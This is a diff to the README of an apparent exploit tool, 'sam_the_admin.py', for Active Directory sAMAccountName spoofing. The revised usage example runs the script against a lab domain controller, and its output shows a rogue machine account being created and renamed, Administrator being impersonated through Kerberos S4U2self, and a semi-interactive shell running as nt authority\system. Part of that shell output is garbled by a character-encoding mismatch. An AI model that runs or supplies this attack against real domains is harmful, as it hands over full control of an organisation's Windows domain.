@@ -41,21 +41,23 @@ usage:
 ![image](https://user-images.githubusercontent.com/16593068/146140741-c00f1618-92c8-4d1f-be0c-781e4f660aed.png)
 
 ```bash
-$ python3 sam_the_admin.py "jas502n/John:Admin@123" -dc-ip 172.16.242.135 -shell
+$ python3 sam_the_admin.py "jas502n/hr:Admin@12" -dc-ip 172.16.242.135 -shell
+
+
 Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 
 [*] Selected Target dc01.jas502n.com
 [*] Total Domain Admins 1
 [*] will try to impersonat Administrator
 [*] Current ms-DS-MachineAccountQuota = 10
-[*] Adding Computer Account "SAMTHEADMIN-91$"
-[*] MachineAccount "SAMTHEADMIN-91$" password = OHjbpG6omtbD
-[*] Successfully added machine account SAMTHEADMIN-91$ with password OHjbpG6omtbD.
-[*] SAMTHEADMIN-91$ object = CN=SAMTHEADMIN-91,CN=Computers,DC=jas502n,DC=com
-[*] SAMTHEADMIN-91$ sAMAccountName == dc01
+[*] Adding Computer Account "SAMTHEADMIN-59$"
+[*] MachineAccount "SAMTHEADMIN-59$" password = @L!LeScGKcBA
+[*] Successfully added machine account SAMTHEADMIN-59$ with password @L!LeScGKcBA.
+[*] SAMTHEADMIN-59$ object = CN=SAMTHEADMIN-59,CN=Computers,DC=jas502n,DC=com
+[*] SAMTHEADMIN-59$ sAMAccountName == dc01
 [*] Saving ticket in dc01.ccache
-[*] Resting the machine account to SAMTHEADMIN-91$
-[*] Restored SAMTHEADMIN-91$ sAMAccountName to original value
+[*] Resting the machine account to SAMTHEADMIN-59$
+[*] Restored SAMTHEADMIN-59$ sAMAccountName to original value
 [*] Using TGT from cache
 [*] Impersonating Administrator
 [*] 	Requesting S4U2self
@@ -63,28 +65,41 @@ Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 
 [!] Launching semi-interactive shell - Careful what you execute
-C:\Windows\system32>ipconfig
+C:\Windows\system32>whoami
+nt authority\system
+
+C:\Windows\system32>net user hr
 [-] Decoding error detected, consider running chcp.com at the target,
 map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
 and then execute smbexec.py again with -codec and the corresponding codec
+�û���                 hr
+ȫ��
+ע��
+�û���ע��
+����/��������          000 (ϵͳĬ��ֵ)
+�ʻ�����               Yes
+�ʻ�����               �Ӳ�
 
-Windows IP ����
+�ϴ���������           2021/12/15 16:25:45
+���뵽��               2022/1/26 16:25:45
+����ɸ���             2021/12/16 16:25:45
+��Ҫ����               Yes
+�û����Ը�������       Yes
+
+�����Ĺ���վ           All
+��¼�ű�
+�û������ļ�
+��Ŀ¼
+�ϴε�¼               �Ӳ�
+
+�������ĵ�¼Сʱ��     All
+
+�������Ա
+ȫ�����Ա             *Domain Users
+����ɹ���ɡ�
 
 
-��̫�������� Ethernet0:
-
-   �����ض��� DNS ��׺ . . . . . . . :
-   IPv4 ��ַ . . . . . . . . . . . . : 172.16.242.135
-   ��������  . . . . . . . . . . . . : 255.255.255.0
-   Ĭ������. . . . . . . . . . . . . : 172.16.242.2
-
-���������� isatap.{B575E710-D7D9-44AD-B5AF-77922F8E0DAF}:
-
-   ý��״̬  . . . . . . . . . . . . : ý���ѶϿ�
-   �����ض��� DNS ��׺ . . . . . . . :
-
-C:\Windows\system32>whoami
-nt authority\system
+C:\Windows\system32>
 ```
 
 ### dump
